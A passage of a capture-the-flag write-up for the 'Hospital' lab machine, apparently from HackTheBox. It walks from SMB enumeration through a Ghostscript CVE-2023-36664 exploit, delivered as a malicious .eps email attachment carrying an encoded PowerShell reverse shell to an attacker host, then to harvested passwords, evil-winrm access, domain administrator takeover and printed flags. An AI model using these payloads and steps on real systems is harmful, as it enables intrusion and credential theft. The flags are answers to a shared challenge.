SMB         hospital.htb    445    DC               522: HOSPITAL\Cloneable Domain Controllers (SidTypeGroup)
SMB         hospital.htb    445    DC               525: HOSPITAL\Protected Users (SidTypeGroup)
SMB         hospital.htb    445    DC               526: HOSPITAL\Key Admins (SidTypeGroup)
SMB         hospital.htb    445    DC               527: HOSPITAL\Enterprise Key Admins (SidTypeGroup)
SMB         hospital.htb    445    DC               553: HOSPITAL\RAS and IAS Servers (SidTypeAlias)
SMB         hospital.htb    445    DC               571: HOSPITAL\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         hospital.htb    445    DC               572: HOSPITAL\Denied RODC Password Replication Group (SidTypeAlias)
SMB         hospital.htb    445    DC               1000: HOSPITAL\DC$ (SidTypeUser)
SMB         hospital.htb    445    DC               1101: HOSPITAL\DnsAdmins (SidTypeAlias)
SMB         hospital.htb    445    DC               1102: HOSPITAL\DnsUpdateProxy (SidTypeGroup)
SMB         hospital.htb    445    DC               1124: HOSPITAL\$431000-R1KSAI1DGHMH (SidTypeUser)
SMB         hospital.htb    445    DC               1125: HOSPITAL\SM_0559ce7ac4be4fc6a (SidTypeUser)
SMB         hospital.htb    445    DC               1126: HOSPITAL\SM_bb030ff39b6c4a2db (SidTypeUser)
SMB         hospital.htb    445    DC               1127: HOSPITAL\SM_9326b57ae8ea44309 (SidTypeUser)
SMB         hospital.htb    445    DC               1128: HOSPITAL\SM_b1b9e7f83082488ea (SidTypeUser)
SMB         hospital.htb    445    DC               1129: HOSPITAL\SM_e5b6f3aed4da4ac98 (SidTypeUser)
SMB         hospital.htb    445    DC               1130: HOSPITAL\SM_75554ef7137f41d68 (SidTypeUser)
SMB         hospital.htb    445    DC               1131: HOSPITAL\SM_6e9de17029164abdb (SidTypeUser)
SMB         hospital.htb    445    DC               1132: HOSPITAL\SM_5faa2be1160c4ead8 (SidTypeUser)
SMB         hospital.htb    445    DC               1133: HOSPITAL\SM_2fe3f3cbbafa4566a (SidTypeUser)
SMB         hospital.htb    445    DC               1601: HOSPITAL\drbrown (SidTypeUser)
SMB         hospital.htb    445    DC               1602: HOSPITAL\drwilliams (SidTypeUser)
SMB         hospital.htb    445    DC               3101: HOSPITAL\Loggers (SidTypeAlias)
```

### Enumeration of Port 443/TCP

> https://hospital.htb

| Username | Password |
| --- | --- |
| drwilliams | qwe123!@# |

```c
Dear Lucy,

I wanted to remind you that the project for lighter, cheaper and
environmentally friendly needles is still ongoing 💉. You are the one in
charge of providing me with the designs for these so that I can take
them to the 3D printing department and start producing them right away.
Please make the design in an ".eps" file format so that it can be well
visualized with GhostScript.

Best regards,
Chris Brown.
😃
```

## Foothold via CVE-2023-36664 Ghostscript Command Injection

> https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

```c
┌──(user㉿kali)-[/media/…/machines/hospital/files/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 CVE_2023_36664_exploit.py --inject --payload "cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQA3ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --filename file.eps
[+] Payload successfully injected into file.eps.
```

We replied to the mail with the attached file.

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.50.89] 12890

PS C:\Users\drbrown.HOSPITAL\Documents>
```

## user.txt

```c
PS C:\Users\drbrown.HOSPITAL\Desktop> type user.txt
9ef4e00265c45190e34230b858232c1c
```

## Privilege Escalation to drbrown

```c
PS C:\Users\drbrown.HOSPITAL\Documents> type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

| Username | Password |
| --- | --- |
| drbrown | chr!$br0wn |

```c
┌──(user㉿kali)-[~]
└─$ evil-winrm -i hospital.htb -u drbrown -p 'chr!$br0wn'                         
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents>
```

```c
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
hospital\drbrown S-1-5-21-4208260710-2273545631-1523135639-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users               Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/hospital/files]
└─$ bloodhound-python -u 'drbrown' -p 'chr!$br0wn' -d hospital.htb -c ALL -ns 10.129.50.89 
INFO: Found AD domain: hospital.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.hospital.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.hospital.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.hospital.htb
INFO: Done in 00M 26S
```

```c
┌──(user㉿kali)-[~]
└─$ xfreerdp /u:drbrown /p:'chr!$br0wn' /v:10.129.50.89 /dynamic-resolution +clipboard  
[21:10:28:522] [102102:102103] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[21:10:28:522] [102102:102103] [WARN][com.freerdp.crypto] - CN = DC.hospital.htb
[21:10:28:524] [102102:102103] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:10:28:524] [102102:102103] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:10:28:524] [102102:102103] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:10:28:524] [102102:102103] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.50.89:3389) 
[21:10:28:524] [102102:102103] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:10:28:524] [102102:102103] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:10:28:524] [102102:102103] [ERROR][com.freerdp.crypto] -    DC.hospital.htb
[21:10:28:524] [102102:102103] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.50.89:3389 (RDP-Server):
        Common Name: DC.hospital.htb
        Subject:     CN = DC.hospital.htb
        Issuer:      CN = DC.hospital.htb
        Thumbprint:  f5:50:b5:6a:96:ff:28:90:ff:04:a0:d7:27:cc:de:a6:7a:41:f5:81:fc:6f:47:da:95:57:e3:7f:ef:bf:67:52
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[21:10:33:257] [102102:102103] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[21:10:33:257] [102102:102103] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[21:10:33:282] [102102:102103] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[21:10:33:283] [102102:102103] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[21:10:33:283] [102102:102103] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

There was a shell open with the following input.

```c
There was an error managing iexplorer (error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/mirror/selenium): error trying to connect: dns error: This is usually a temporary error during hostname resolution and means that the local server did not receive a response from an authoritative server. (os error 11002)); using driver found in the cache  
```

We unhided the password input and got the administrator password.

| Username | Password |
| --- | --- |
| administrator | Th3B3stH0sp1t4l9786! |

```c
┌──(user㉿kali)-[~]
└─$ evil-winrm -i hospital.htb -u administrator -p 'Th3B3stH0sp1t4l9786!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## root.txt

```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
e5596a6bdca5307c4f4b640e3364a569
```
